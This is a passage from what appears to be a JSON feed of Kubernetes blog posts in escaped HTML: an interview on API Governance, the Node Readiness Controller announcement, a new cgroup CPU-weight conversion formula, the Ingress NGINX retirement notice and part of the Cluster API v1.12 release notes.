Tell us a bit about yourself, your role and how\nyou got involved in Kubernetes.</strong></p>\n<p><strong>JL</strong>: My name is Jordan Liggitt. I'm a Christian, husband, father of four, software engineer at\n<a href=\"https://about.google/\">Google</a> by day, and <a href=\"https://www.youtube.com/watch?v=UDdr-VIWQwo\">amateur musician</a> by stealth. I was born in Texas (and still\nlike to claim it as my point of origin), but I've lived in North Carolina for most of my life.</p>\n<p>I've been working on Kubernetes since 2014. At that time, I was working on authentication and\nauthorization at Red Hat, and my very first pull request to Kubernetes attempted to <a href=\"https://github.com/kubernetes/kubernetes/pull/2328\">add an OAuth\nserver</a> to the Kubernetes API server. It never\nexited work-in-progress status. I ended up going with a different approach that layered on top of\nthe core Kubernetes API server in a different project (spoiler alert: this is foreshadowing), and I\nclosed it without merging six months later.</p>\n<p>Undeterred by that start, I stayed involved, helped build Kubernetes authentication and\nauthorization capabilities, and got involved in the definition and evolution of the core Kubernetes\nAPIs from early beta APIs, like <code>v1beta3</code> to <code>v1</code>. I got tagged as an API reviewer in 2016 based on\nthose contributions, and was added as an API approver in 2017.</p>\n<p>Today, I help lead the API Governance and code organization subprojects for SIG Architecture, and I\nam a tech lead for SIG Auth.</p>\n<p><strong>FM: And when did you get specifically involved in the API Governance project?</strong></p>\n<p><strong>JL</strong>: Around 2019.</p>\n<h2 id=\"goals-and-scope-of-api-governance\">Goals and scope of API Governance</h2>\n<p><strong>FM: How would you describe the main goals and areas of intervention of the subproject?</strong></p>\n<p>The surface area includes all the various APIs Kubernetes has, and there are APIs that people do not\nalways realize are APIs: command-line flags, configuration files, how binaries are run, how they\ntalk to back-end components like the container runtime, and how they persist data. People often\nthink of &quot;the API&quot; as only the <a href=\"https://kubernetes.io/docs/reference/using-api/\">REST API</a>... that\nis the biggest and most obvious one, and the one with the largest audience, but all of these other\nsurfaces are also APIs. Their audiences are narrower, so there is more flexibility there, but they\nstill require consideration.</p>\n<p>The goals are to be stable while still enabling innovation. Stability is easy if you never change\nanything, but that contradicts the goal of evolution and growth. So we balance &quot;be stable&quot; with\n&quot;allow change&quot;.</p>\n<p><strong>FM: Speaking of changes, in terms of ensuring consistency and quality (which is clearly one of the\nreasons this project exists), what are the specific quality gates in the lifecycle of a Kubernetes\nchange? Does API Governance get involved during the release cycle, prior to it through guidelines,\nor somewhere in between? At what points do you ensure the intended role is fulfilled?</strong></p>\n<p><strong>JL</strong>: We have <a href=\"https://github.com/kubernetes/community/blob/master/contributors/devel/sig-architecture/api-conventions.md\">guidelines and\nconventions</a>,\nboth for APIs in general and for how to change an API. These are living documents that we update as\nwe encounter new scenarios. They are long and dense, so we also support them with involvement at\neither the design stage or the implementation stage.</p>\n<p>Sometimes, due to bandwidth constraints, teams move ahead with design work without feedback from <a href=\"https://github.com/kubernetes/community/blob/master/sig-architecture/api-review-process.md\">API Review</a>. That’s fine, but it means that when implementation begins, the API review will happen then,\nand there may be substantial feedback. So we get involved when a new API is created or an existing\nAPI is changed, either at design or implementation.</p>\n<p><strong>FM: Is this during the Kubernetes Enhancement Proposal (KEP) process? Since KEPs are mandatory for\nenhancements, I assume part of the work intersects with API Governance?</strong></p>\n<p><strong>JL</strong>: It can. <a href=\"https://github.com/kubernetes/enhancements/blob/master/keps/README.md\">KEPs</a> vary\nin how detailed they are. Some include literal API definitions. When they do, we can perform an API\nreview at the design stage. Then implementation becomes a matter of checking fidelity to the design.</p>\n<p>Getting involved early is ideal. But some KEPs are conceptual and leave details to the\nimplementation. That’s not wrong; it just means the implementation will be more exploratory. Then\nAPI Review gets involved later, possibly recommending structural changes.</p>\n<p>There’s a trade-off regardless: detailed design upfront versus iterative discovery during\nimplementation. People and teams work differently, and we’re flexible and happy to consult early or\nat implementation time.</p>\n<p><strong>FM: This reminds me of what Fred Brooks wrote in &quot;The Mythical Man-Month&quot; about conceptual\nintegrity being central to product quality... No matter how you structure the process, there must be\na point where someone looks at what is coming and ensures conceptual integrity. Kubernetes uses APIs\neverywhere -- externally and internally -- so API Governance is critical to maintaining that\nintegrity. How is this captured?</strong></p>\n<p><strong>JL</strong>: Yes, the conventions document captures patterns we’ve learned over time: what to do in\nvarious situations. We also have automated linters and checks to ensure correctness around patterns\nlike spec/status semantics. These automated tools help catch issues even when humans miss them.</p>\n<p>As new scenarios arise -- and they do constantly -- we think through how to approach them and fold\nthe results back into our documentation and tools. Sometimes it takes a few attempts before we\nsettle on an approach that works well.</p>\n<p><strong>FM: Exactly. Each new interaction improves the guidelines.</strong></p>\n<p><strong>JL</strong>: Right. And sometimes the first approach turns out to be wrong. It may take two or three\niterations before we land on something robust.</p>\n<h2 id=\"the-impact-of-custom-resource-definitions\">The impact of Custom Resource Definitions</h2>\n<p><strong>FM: Is there any particular change, episode, or domain that stands out as especially noteworthy,\ncomplex, or interesting in your experience?</strong></p>\n<p><strong>JL</strong>: The watershed moment was <a href=\"https://kubernetes.io/docs/concepts/extend-kubernetes/api-extension/custom-resources/\">Custom Resources</a>.\nPrior to that, every API was handcrafted by us and fully reviewed. There were inconsistencies, but\nwe understood and controlled every type and field.</p>\n<p>When Custom Resources arrived, anyone could define anything. The first version did not even require\na schema. That made it extremely powerful -- it enabled change immediately -- but it left us playing\ncatch-up on stability and consistency.</p>\n<p>When Custom Resources graduated to General Availability (GA), schemas became required, but escape\nhatches still existed for backward compatibility. Since then, we’ve been working on giving CRD\nauthors validation capabilities comparable to built-ins. Built-in validation rules for CRDs have\nonly just reached GA in the last few releases.</p>\n<p>So CRDs opened the &quot;anything is possible&quot; era. Built-in validation rules are the second major\nmilestone: bringing consistency back.</p>\n<p>The three major themes have been defining schemas, validating data, and handling pre-existing\ninvalid data. With ratcheting validation (allowing data to improve without breaking existing\nobjects), we can now guide CRD authors toward conventions without breaking the world.</p>\n<h2 id=\"api-governance-in-context\">API Governance in context</h2>\n<p><strong>FM: How does API Governance relate to SIG Architecture and API Machinery?</strong></p>\n<p><strong>JL</strong>: <a href=\"https://github.com/kubernetes/apimachinery\">API Machinery</a> provides the actual code and\ntools that people build APIs on. They don’t review APIs for storage, networking, scheduling, etc.</p>\n<p>SIG Architecture sets the overall system direction and works with API Machinery to ensure the system\nsupports that direction. API Governance works with other SIGs building on that foundation to define\nconventions and patterns, ensuring consistent use of what API Machinery provides.</p>\n<p><strong>FM: Thank you. That clarifies the flow. Going back to <a href=\"https://kubernetes.io/releases/release/\">release cycles</a>: do release phases -- enhancements freeze, code\nfreeze -- change your workload? Or is API Governance mostly continuous?</strong></p>\n<p><strong>JL</strong>: We get involved in two places: design and implementation. Design involvement increases\nbefore enhancements freeze; implementation involvement increases before code freeze. However, many\nefforts span multiple releases, so there is always some design and implementation happening, even\nfor work targeting future releases. Between those intense periods, we often have time to work on\nlong-term design work.</p>\n<p>An anti-pattern we see is teams thinking about a large feature for months and then presenting it\nthree weeks before enhancements freeze, saying, &quot;Here is the design, please review.&quot; For big changes\nwith API impact, it’s much better to involve API Governance early.</p>\n<p>And there are good times in the cycle for this -- between freezes -- when people have bandwidth.\nThat’s when long-term review work fits best.</p>\n<h2 id=\"getting-involved\">Getting involved</h2>\n<p><strong>FM: Clearly. Now, regarding team dynamics and new contributors: how can someone get involved in\nAPI Governance? What should they focus on?</strong></p>\n<p><strong>JL</strong>: It’s usually best to follow a specific change rather than trying to learn everything at\nonce. Pick a small API change, perhaps one someone else is making or one you want to make, and\nobserve the full process: design, implementation, review.</p>\n<p>High-bandwidth review -- live discussion over video -- is often very effective. If you’re making or\nfollowing a change, ask whether there’s a time to go over the design or PR together. Observing those\ndiscussions is extremely instructive.</p>\n<p>Start with a small change. Then move to a bigger one. Then maybe a new API. That builds\nunderstanding of conventions as they are applied in practice.</p>\n<p><strong>FM: Excellent. Any final comments, or anything we missed?</strong></p>\n<p><strong>JL</strong>: Yes... the reason we care so much about compatibility and stability is for our users. It’s\neasy for contributors to see those requirements as painful obstacles preventing cleanup or requiring\ntedious work... but users integrated with our system, and we made a promise to them: we want them to\ntrust that we won’t break that contract. So even when it requires more work, moves slower, or\ninvolves duplication, we choose stability.</p>\n<p>We are not trying to be obstructive; we are trying to make life good for users.</p>\n<p>A lot of our questions focus on the future: you want to do something now... how will you evolve it\nlater without breaking it? We assume we will know more in the future, and we want the design to\nleave room for that.</p>\n<p>We also assume we will make mistakes. The question then is: how do we leave ourselves avenues to\nimprove while keeping compatibility promises?</p>\n<p><strong>FM: Exactly. Jordan, thank you, I think we’ve covered everything. This has been an insightful view\ninto the API Governance project and its role in the wider Kubernetes project.</strong></p>\n<p><strong>JL</strong>: Thank you.</p>",

However, in modern Kubernetes environments, nodes require complex infrastructure dependencies—such as network agents, storage drivers, GPU firmware, or custom health checks—to be fully operational before they can reliably host pods.</p>\n<p>Today, on behalf of the Kubernetes project, I am announcing the <a href=\"https://node-readiness-controller.sigs.k8s.io/\">Node Readiness Controller</a>.\nThis project introduces a declarative system for managing node taints, extending the readiness guardrails during node bootstrapping beyond standard conditions.\nBy dynamically managing taints based on custom health signals, the controller ensures that workloads are only placed on nodes that met all infrastructure-specific requirements.</p>\n<h2 id=\"why-the-node-readiness-controller\">Why the Node Readiness Controller?</h2>\n<p>Core Kubernetes Node &quot;Ready&quot; status is often insufficient for clusters with sophisticated bootstrapping requirements. Operators frequently struggle to ensure that specific DaemonSets or local services are healthy before a node enters the scheduling pool.</p>\n<p>The Node Readiness Controller fills this gap by allowing operators to define custom scheduling gates tailored to specific node groups. This enables you to enforce\ndistinct readiness requirements across heterogeneous clusters, ensuring for example, that GPU equipped nodes only accept pods once specialized drivers are verified,\nwhile general purpose nodes follow a standard path.</p>\n<p>It provides three primary advantages:</p>\n<ul>\n<li><strong>Custom Readiness Definitions</strong>: Define what <em>ready</em> means for your specific platform.</li>\n<li><strong>Automated Taint Management</strong>: The controller automatically applies or removes node taints based on condition status, preventing pods from landing on unready infrastructure.</li>\n<li><strong>Declarative Node Bootstrapping</strong>: Manage multi-step node initialization reliably, with a clear observability into the bootstrapping process.</li>\n</ul>\n<h2 id=\"core-concepts-and-features\">Core concepts and features</h2>\n<p>The controller centers around the NodeReadinessRule (NRR) API, which allows you to define declarative <em>gates</em> for your nodes.</p>\n<h3 id=\"flexible-enforcement-modes\">Flexible enforcement modes</h3>\n<p>The controller supports two distinct operational modes:</p>\n<dl>\n<dt>Continuous enforcement</dt>\n<dd>Actively maintains the readiness guarantee throughout the node’s entire lifecycle. If a critical dependency (like a device driver) fails later, the node is immediately tainted to prevent new scheduling.</dd>\n<dt>Bootstrap-only enforcement</dt>\n<dd>Specifically for one-time initialization steps, such as pre-pulling heavy images or hardware provisioning. Once conditions are met, the controller marks the bootstrap as complete and stops monitoring that specific rule for the node.</dd>\n</dl>\n<h3 id=\"condition-reporting\">Condition reporting</h3>\n<p>The controller reacts to Node Conditions rather than performing health checks itself. This decoupled design allows it to integrate seamlessly with other tools existing in the ecosystem as well as custom solutions:</p>\n<ul>\n<li><strong><a href=\"https://github.com/kubernetes/node-problem-detector\">Node Problem Detector</a> (NPD)</strong>: Use existing NPD setups and custom scripts to report node health.</li>\n<li><strong>Readiness Condition Reporter</strong>: A lightweight agent provided by the project that can be deployed to periodically check local HTTP endpoints and patch node conditions accordingly.</li>\n</ul>\n<h3 id=\"operational-safety-with-dry-run\">Operational safety with dry run</h3>\n<p>Deploying new readiness rules across a fleet carries inherent risk. To mitigate this, <em>dry run</em> mode allows operators to first simulate impact on the cluster.\nIn this mode, the controller logs intended actions and updates the rule's status to show affected nodes without applying actual taints, enabling safe validation before enforcement.</p>\n<h2 id=\"example-cni-bootstrapping\">Example: CNI bootstrapping</h2>\n<p>The following NodeReadinessRule ensures a node remains unschedulable until its CNI agent is functional. The controller monitors a custom <code>cniplugin.example.net/NetworkReady</code> condition and only removes the <code>readiness.k8s.io/acme.com/network-unavailable</code> taint once the status is True.</p>\n<div class=\"highlight\"><pre tabindex=\"0\"><code class=\"language-yaml\"><span style=\"display: flex;\"><span><span style=\"color: #008000; font-weight: bold;\">apiVersion</span>:<span style=\"color: #bbb;\"> </span>readiness.node.x-k8s.io/v1alpha1<span style=\"color: #bbb;\">\n</span></span></span><span style=\"display: flex;\"><span><span style=\"color: #bbb;\"></span><span style=\"color: #008000; font-weight: bold;\">kind</span>:<span style=\"color: #bbb;\"> </span>NodeReadinessRule<span style=\"color: #bbb;\">\n</span></span></span><span style=\"display: flex;\"><span><span style=\"color: #bbb;\"></span><span style=\"color: #008000; font-weight: bold;\">metadata</span>:<span style=\"color: #bbb;\">\n</span></span></span><span style=\"display: flex;\"><span><span style=\"color: #bbb;\"> </span><span style=\"color: #008000; font-weight: bold;\">name</span>:<span style=\"color: #bbb;\"> </span>network-readiness-rule<span style=\"color: #bbb;\">\n</span></span></span><span style=\"display: flex;\"><span><span style=\"color: #bbb;\"></span><span style=\"color: #008000; font-weight: bold;\">spec</span>:<span style=\"color: #bbb;\">\n</span></span></span><span style=\"display: flex;\"><span><span style=\"color: #bbb;\"> </span><span style=\"color: #008000; font-weight: bold;\">conditions</span>:<span style=\"color: #bbb;\">\n</span></span></span><span style=\"display: flex;\"><span><span style=\"color: #bbb;\"> </span>- <span style=\"color: #008000; font-weight: bold;\">type</span>:<span style=\"color: #bbb;\"> </span><span style=\"color: #b44;\">\"cniplugin.example.net/NetworkReady\"</span><span style=\"color: #bbb;\">\n</span></span></span><span style=\"display: flex;\"><span><span style=\"color: #bbb;\"> </span><span style=\"color: #008000; font-weight: bold;\">requiredStatus</span>:<span style=\"color: #bbb;\"> </span><span style=\"color: #b44;\">\"True\"</span><span style=\"color: #bbb;\">\n</span></span></span><span style=\"display: flex;\"><span><span style=\"color: #bbb;\"> </span><span style=\"color: #008000; font-weight: bold;\">taint</span>:<span style=\"color: #bbb;\">\n</span></span></span><span style=\"display: flex;\"><span><span style=\"color: #bbb;\"> </span><span style=\"color: #008000; font-weight: bold;\">key</span>:<span style=\"color: #bbb;\"> </span><span style=\"color: #b44;\">\"readiness.k8s.io/acme.com/network-unavailable\"</span><span style=\"color: #bbb;\">\n</span></span></span><span style=\"display: flex;\"><span><span style=\"color: #bbb;\"> </span><span style=\"color: #008000; font-weight: bold;\">effect</span>:<span style=\"color: #bbb;\"> </span><span style=\"color: #b44;\">\"NoSchedule\"</span><span style=\"color: #bbb;\">\n</span></span></span><span style=\"display: flex;\"><span><span style=\"color: #bbb;\"> </span><span style=\"color: #008000; font-weight: bold;\">value</span>:<span style=\"color: #bbb;\"> </span><span style=\"color: #b44;\">\"pending\"</span><span style=\"color: #bbb;\">\n</span></span></span><span style=\"display: flex;\"><span><span style=\"color: #bbb;\"> </span><span style=\"color: #008000; font-weight: bold;\">enforcementMode</span>:<span style=\"color: #bbb;\"> </span><span style=\"color: #b44;\">\"bootstrap-only\"</span><span style=\"color: #bbb;\">\n</span></span></span><span style=\"display: flex;\"><span><span style=\"color: #bbb;\"> </span><span style=\"color: #008000; font-weight: bold;\">nodeSelector</span>:<span style=\"color: #bbb;\">\n</span></span></span><span style=\"display: flex;\"><span><span style=\"color: #bbb;\"> </span><span style=\"color: #008000; font-weight: bold;\">matchLabels</span>:<span style=\"color: #bbb;\">\n</span></span></span><span style=\"display: flex;\"><span><span style=\"color: #bbb;\"> </span><span style=\"color: #008000; font-weight: bold;\">node-role.kubernetes.io/worker</span>:<span style=\"color: #bbb;\"> </span><span style=\"color: #b44;\">\"\"</span><span style=\"color: #bbb;\">\n</span></span></span></code></pre></div><p><strong>Demo</strong>:</p>\n<div style=\"padding-bottom: 56.25%; height: 0; overflow: hidden;\">\n\n</div>\n<h2 id=\"getting-involved\">Getting involved</h2>\n<p>The Node Readiness Controller is just getting started, with our <a href=\"https://github.com/kubernetes-sigs/node-readiness-controller/releases/tag/v0.1.1\">initial releases</a> out, and we are seeking community feedback to refine the roadmap.

      "summary": "<p>I'm excited to announce the implementation of an improved conversion formula\nfrom cgroup v1 CPU shares to cgroup v2 CPU weight. This enhancement addresses\ncritical issues with CPU priority allocation for Kubernetes workloads when\nrunning on systems with cgroup v2.</p>\n<h2 id=\"background\">Background</h2>\n<p>Kubernetes was originally designed with cgroup v1 in mind, where CPU shares\nwere defined simply by assigning the container's CPU requests in millicpu\nform.</p>\n<p>For example, a container requesting 1 CPU (1024m) would get (cpu.shares = 1024).</p>\n<p>After a while, cgroup v1 started being replaced by its successor,\ncgroup v2. In cgroup v2, the concept of CPU shares (which ranges from 2 to\n262144, or from 2¹ to 2¹⁸) was replaced with CPU weight (which ranges from\n[1, 10000], or 10⁰ to 10⁴).</p>\n<p>With the transition to cgroup v2,\n<a href=\"https://github.com/kubernetes/enhancements/tree/master/keps/sig-node/2254-cgroup-v2\">KEP-2254</a>\nintroduced a conversion formula to map cgroup v1 CPU shares to cgroup v2 CPU\nweight. The conversion formula was defined as: <code>cpu.weight = (1 + ((cpu.shares - 2) * 9999) / 262142)</code></p>\n<p>This formula linearly maps values from [2¹, 2¹⁸] to [10⁰, 10⁴].</p>\n<p><img alt=\"Linear conversion formula\" src=\"https://kubernetes.io/blog/2026/01/30/new-cgroup-v1-to-v2-cpu-conversion-formula/linear-conversion.png\" title=\"formula\" /></p>\n<p>While this approach is simple, the linear mapping imposes a few significant\nproblems and impacts both performance and configuration granularity.</p>\n<h2 id=\"problems-with-previous-conversion-formula\">Problems with previous conversion formula</h2>\n<p>The current conversion formula creates two major issues:</p>\n<h3 id=\"1-reduced-priority-against-non-kubernetes-workloads\">1. Reduced priority against non-Kubernetes workloads</h3>\n<p>In cgroup v1, the default value for CPU shares is <code>1024</code>, meaning a container\nrequesting 1 CPU has equal priority with system processes that live outside\nof Kubernetes' scope.\nHowever, in cgroup v2, the default CPU weight is <code>100</code>, but the current\nformula converts 1 CPU (1024m) to only <code>≈39</code> weight - less than 40% of the\ndefault.</p>\n<p><strong>Example:</strong></p>\n<ul>\n<li>Container requesting 1 CPU (1024m)</li>\n<li>cgroup v1: <code>cpu.shares = 1024</code> (equal to default)</li>\n<li>cgroup v2 (current): <code>cpu.weight = 39</code> (much lower than default 100)</li>\n</ul>\n<p>This means that after moving to cgroup v2, Kubernetes (or OCI) workloads would\nde-facto reduce their CPU priority against non-Kubernetes processes. The\nproblem can be severe for setups with many system daemons that run\noutside of Kubernetes' scope and expect Kubernetes workloads to have\npriority, especially in situations of resource starvation.</p>\n<h3 id=\"2-unmanageable-granularity\">2. Unmanageable granularity</h3>\n<p>The current formula produces very low values for small CPU requests,\nlimiting the ability to create sub-cgroups within containers for\nfine-grained resource distribution (which will possibly be much easier moving\nforward, see <a href=\"https://github.com/kubernetes/enhancements/issues/5474\">KEP #5474</a> for more info).</p>\n<p><strong>Example:</strong></p>\n<ul>\n<li>Container requesting 100m CPU</li>\n<li>cgroup v1: <code>cpu.shares = 102</code></li>\n<li>cgroup v2 (current): <code>cpu.weight = 4</code> (too low for sub-cgroup\nconfiguration)</li>\n</ul>\n<p>With cgroup v1, requesting 100m CPU which led to 102 CPU shares was manageable\nin the sense that sub-cgroups could have been created inside the main\ncontainer, assigning fine-grained CPU priorities for different groups of\nprocesses. With cgroup v2 however, having 4 shares is very hard to\ndistribute between sub-cgroups since it's not granular enough.</p>\n<p>With plans to allow <a href=\"https://github.com/kubernetes/enhancements/issues/5474\">writable cgroups for unprivileged containers</a>,\nthis becomes even\nmore relevant.</p>\n<h2 id=\"new-conversion-formula\">New conversion formula</h2>\n<h3 id=\"description\">Description</h3>\n<p>The new formula is more complicated, but does a much better job mapping\nbetween cgroup v1 CPU shares and cgroup v2 CPU weight:</p>\n<div class=\"math\">$$cpu.weight = \\lceil 10^{(L^{2}/612 + 125L/612 - 7/34)} \\rceil, \\text{ where: } L = \\log_2(cpu.shares)$$</div><p>The idea is that this is a quadratic function to cross the following values:</p>\n<ul>\n<li>(2, 1): The minimum values for both ranges.</li>\n<li>(1024, 100): The default values for both ranges.</li>\n<li>(262144, 10000): The maximum values for both ranges.</li>\n</ul>\n<p>Visually, the new function looks as follows:</p>\n<p><img alt=\"2025-10-25-new-cgroup-v1-to-v2-conversion-formula-new-conversion.png\" src=\"https://kubernetes.io/blog/2026/01/30/new-cgroup-v1-to-v2-cpu-conversion-formula/new-conversion-formula.png\" /></p>\n<p>And if you zoom in to the important part:</p>\n<p><img alt=\"2025-10-25-new-cgroup-v1-to-v2-conversion-formula-new-conversion-zoom.png\" src=\"https://kubernetes.io/blog/2026/01/30/new-cgroup-v1-to-v2-cpu-conversion-formula/new-conversion-formula-zoom.png\" /></p>\n<p>The new formula is &quot;close to linear&quot;, yet it is carefully designed to\nmap the ranges in a clever way so the three important points above would\ncross.</p>\n<h3 id=\"how-it-solves-the-problems\">How it solves the problems</h3>\n<ol>\n<li>\n<p><strong>Better priority alignment:</strong></p>\n<ul>\n<li>A container requesting 1 CPU (1024m) will now get a <code>cpu.weight = 102</code>. This\nvalue is close to cgroup v2's default 100.\nThis restores the intended priority relationship between Kubernetes\nworkloads and system processes.</li>\n</ul>\n</li>\n<li>\n<p><strong>Improved granularity:</strong></p>\n<ul>\n<li>A container requesting 100m CPU will get <code>cpu.weight = 17</code>, (see\n<a href=\"https://go.dev/play/p/sLlAfCg54Eg\">here</a>).\nEnables better fine-grained resource distribution within containers.</li>\n</ul>\n</li>\n</ol>\n<h2 id=\"adoption-and-integration\">Adoption and integration</h2>\n<p>This change was implemented at the OCI layer.\nIn other words, this is not implemented in Kubernetes itself; therefore the\nadoption of the new conversion formula depends solely on the OCI runtime\nadoption.</p>\n<p>For example:</p>\n<ul>\n<li>runc: The new formula is enabled from version <a href=\"https://github.com/opencontainers/runc/releases/tag/v1.3.2\">1.3.2</a>.</li>\n<li>crun: The new formula is enabled from version <a href=\"https://github.com/containers/crun/releases/tag/1.23\">1.23</a>.</li>\n</ul>\n<h3 id=\"impact-on-existing-deployments\">Impact on existing deployments</h3>\n<p><strong>Important:</strong> Some consumers may be affected if they assume the older linear conversion formula.\nApplications or monitoring tools that directly calculate expected CPU weight values based on the\nprevious formula may need updates to account for the new quadratic conversion.\nThis is particularly relevant for:</p>\n<ul>\n<li>Custom resource management tools that predict CPU weight values.</li>\n<li>Monitoring systems that validate or expect specific weight values.</li>\n<li>Applications that programmatically set or verify CPU weight values.</li>\n</ul>\n<p>The Kubernetes project recommends testing the new conversion formula in non-production\nenvironments before upgrading OCI runtimes to ensure compatibility with existing tooling.</p>\n<h2 id=\"where-can-i-learn-more\">Where can I learn more?</h2>\n<p>For those interested in this enhancement:</p>\n<ul>\n<li><a href=\"https://github.com/kubernetes/kubernetes/issues/131216\">Kubernetes GitHub Issue #131216</a> - Detailed technical\nanalysis and examples, including discussions and reasoning for choosing the\nabove formula.</li>\n<li><a href=\"https://github.com/kubernetes/enhancements/tree/master/keps/sig-node/2254-cgroup-v2\">KEP-2254: cgroup v2</a> -\nOriginal cgroup v2 implementation in Kubernetes.</li>\n<li><a href=\"https://kubernetes.io/docs/concepts/configuration/manage-resources-containers/\">Kubernetes cgroup documentation</a> -\nCurrent resource management guidance.</li>\n</ul>\n<h2 id=\"how-do-i-get-involved\">How do I get involved?</h2>\n<p>For those interested in getting involved with Kubernetes node-level\nfeatures, join the <a href=\"https://github.com/kubernetes/community/tree/master/sig-node\">Kubernetes Node Special Interest Group</a>.\nWe always welcome new contributors and diverse perspectives on resource management\nchallenges.</p>",

There will be no more releases for bug fixes, security patches, or any updates of any kind after the project is retired. This cannot be ignored, brushed off, or left until the last minute to address. We cannot overstate the severity of this situation or the importance of beginning migration to alternatives like <a href=\"https://gateway-api.sigs.k8s.io/guides/getting-started/\">Gateway API</a> or one of the many <a href=\"https://kubernetes.io/docs/concepts/services-networking/ingress-controllers/\">third-party Ingress controllers</a> immediately.</p>\n<p>To be abundantly clear: choosing to remain with Ingress NGINX after its retirement leaves you and your users vulnerable to attack. None of the available alternatives are direct drop-in replacements. This will require planning and engineering time. Half of you will be affected. You have two months left to prepare.</p>\n<p><strong>Existing deployments will continue to work, so unless you proactively check, you may not know you are affected until you are compromised.</strong> In most cases, you can check to find out whether or not you rely on Ingress NGINX by running <code>kubectl get pods --all-namespaces --selector app.kubernetes.io/name=ingress-nginx</code> with cluster administrator permissions.</p>\n<p>Despite its broad appeal and widespread use by companies of all sizes, and repeated calls for help from the maintainers, the Ingress NGINX project never received the contributors it so desperately needed. According to internal Datadog research, about 50% of cloud native environments currently rely on this tool, and yet for the last several years, it has been maintained solely by one or two people working in their free time. Without sufficient staffing to maintain the tool to a standard both ourselves and our users would consider secure, the responsible choice is to wind it down and refocus efforts on modern alternatives like <a href=\"https://gateway-api.sigs.k8s.io/guides/getting-started/\">Gateway API</a>.</p>\n<p>We did not make this decision lightly; as inconvenient as it is now, doing so is necessary for the safety of all users and the ecosystem as a whole. Unfortunately, the flexibility Ingress NGINX was designed with, that was once a boon, has become a burden that cannot be resolved. With the technical debt that has piled up, and fundamental design decisions that exacerbate security flaws, it is no longer reasonable or even possible to continue maintaining the tool even if resources did materialize.</p>\n<p>We issue this statement together to reinforce the scale of this change and the potential for serious risk to a significant percentage of Kubernetes users if this issue is ignored. It is imperative that you check your clusters now. If you are reliant on Ingress NGINX, you must begin planning for migration.</p>\n<p>Thank you,</p>\n<p>Kubernetes Steering Committee</p>\n<p>Kubernetes Security Response Committee</p>",

Cluster API considers both valid options and selects the most appropriate mechanism for a given change.</p>\n<p>From the perspective of the Cluster API maintainers, in-place updates are most useful for making changes that don't otherwise require a node drain or pod restart; for example: changing user credentials for the Machine. On the other hand, when the workload will be disrupted anyway, just do a rollout.</p>\n<p>Nevertheless, Cluster API remains true to its extensible nature, and everyone can create their own update extension and decide when and how to use in-place updates by trading in some of the benefits of immutable rollouts.</p>\n<p>For a deep dive into this feature, make sure to attend the session <a href=\"https://kccnceu2026.sched.com/event/2CW1r/in-place-updates-with-cluster-api-the-sweet-spot-between-immutable-and-mutable-infrastructure-fabrizio-pandini-stefan-buringer-broadcom?iframe=yes&amp;w=100%&amp;sidebar=yes&amp;bg=no\">In-place Updates with Cluster API: The Sweet Spot Between Immutable and Mutable Infrastructure</a> at KubeCon EU in Amsterdam!</p>\n<h2 id=\"chained-upgrades\">Chained Upgrades</h2>\n<p><a href=\"https://cluster-api.sigs.k8s.io/tasks/experimental-features/cluster-class/\">ClusterClass</a> and managed topologies in Cluster API jointly provided a powerful and effective framework that acts as a building block for many platforms offering Kubernetes-as-a-Service.</p>\n<p>Now with v1.12.0 this feature is making another important step forward, by allowing users to upgrade by more than one Kubernetes minor version in a single operation, commonly referred to as a <a href=\"https://github.com/kubernetes-sigs/cluster-api/blob/main/docs/proposals/20250513-chained-and-efficient-upgrades-for-clusters-with-managed-topologies.md\">chained upgrade</a>.</p>\n<p>This allows users to declare a target Kubernetes version and let Cluster API safely orchestrate the required intermediate steps, rather than manually managing each minor upgrade.</p>\n<p>The simplest way to explain how chained upgrades work, is that once the user triggers an update by changing the desired version for a Cluster, Cluster API computes an upgrade plan, and then starts executing it. Rather than (for example) update the Cluster to v1.33.0 and then v1.34.0 and then v1.35.0, checking on progress at each step, a chained upgrade lets you go directly to v1.35.0.</p>\n<p>Executing an upgrade plan means upgrading control plane and worker machines in a strictly controlled order, repeating this process as many times as needed to reach the desired state. The Cluster API is now capable of managing this for you.</p>\n<p>Cluster API takes care of optimizing and minimizing the upgrade steps for worker machines, and in fact worker machines will skip upgrades to intermediate Kubernetes minor releases whenever allowed by the Kubernetes version skew policies.</p>\n<figure>\n<img alt=\"Chained upgrades in Cluster API\" src=\"https://kubernetes.io/blog/2026/01/27/cluster-api-v1-12-release/chained.svg\" />\n</figure>\n<p>Also in this case extensibility is at the core of this feature, and <a href=\"https://cluster-api.sigs.k8s.io/tasks/experimental-features/runtime-sdk/implement-upgrade-plan-hooks\">upgrade plan runtime extensions</a> can be used to influence how the upgrade plan is computed; similarly, <a href=\"https://cluster-api.sigs.k8s.io/tasks/experimental-features/runtime-sdk/implement-lifecycle-hooks\">lifecycle hooks</a> can be used to automate other tasks that must be performed during an upgrade, e.g. upgrading an addon after the control plane update completed.</p>\n<p>From our perspective, chained upgrades are most useful for users that struggle to keep up with Kubernetes minor releases, and e.g. they want to upgrade only once per year and then upgrade by three versions (n-3 → n). But be warned: the fact that you can now easily upgrade by more than one minor version is not an excuse to not patch your cluster frequently!</p>\n<h2 id=\"release-team\">Release team</h2>\n<p>I would like to thank all the contributors, the maintainers, and all the engineers that volunteered for the release team.</p>\n<p>The reliability and predictability of Cluster API releases, which is one of the most appreciated features from our users, is only possible with the support, commitment, and hard work of its community.</p>\n<p>Kudos to the entire Cluster API community for the v1.12.0 release and all the great releases delivered in 2025!\n​​\nIf you are interested in getting involved, learn about\n<a href=\"https://cluster-api.sigs.k8s.io/contributing\">Cluster API contributing guidelines</a>.</p>\n<h2 id=\"what-s-next\">What’s next?</h2>\n<p>If you read the <a href=\"https://cluster-api.sigs.k8s.io/user/manifesto\">Cluster API manifesto</a>, you can see how the Cluster API subproject claims the right to remain unfinished, recognizing the need to continuously evolve, improve, and adapt to the changing needs of Cluster API’s users and the broader Cloud Native ecosystem.</p>\n<p>As Kubernetes itself continues to evolve, the Cluster API subproject will keep advancing alongside it, focusing on safer upgrades, reduced disruption, and stronger building blocks for platforms managing Kubernetes at scale.</p>\n<p>Innovation remains at the heart of Cluster API, stay tuned for an exciting 2026!</p>\n<hr />\n<p>Useful links:</p>\n<ul>\n<li><a href=\"https://cluster-api.sigs.k8s.io/\">Cluster API</a></li>\n<li><a href=\"https://github.com/kubernetes-sigs/cluster-api/releases/tag/v1.12.0\">Cluster API v1.12.0 release</a></li>\n<li><a href=\"https://github.com/kubernetes-sigs/cluster-api/blob/main/docs/proposals/20240807-in-place-updates.md\">In-place update proposal</a></li>\n<li><a 